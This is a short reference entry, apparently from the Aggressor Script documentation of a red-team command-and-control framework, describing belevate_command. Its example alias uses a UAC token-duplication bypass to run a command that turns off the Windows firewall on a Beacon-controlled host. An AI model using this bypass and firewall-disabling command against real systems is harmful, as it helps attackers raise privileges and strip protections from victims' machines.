belevate_command

Ask Beacon to run a command in a high-integrity context

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2` - the module/command elevator to use

`$3` - the command and its arguments.

#### Example

```
# disable the firewall
alias shieldsdn {
   belevate_command($1, "uac-token-duplication", "cmd.exe /C netsh advfirewall set allprofiles state off");
}```

See also&beacon_elevator_describe, &beacon_elevator_register, &beacon_elevators
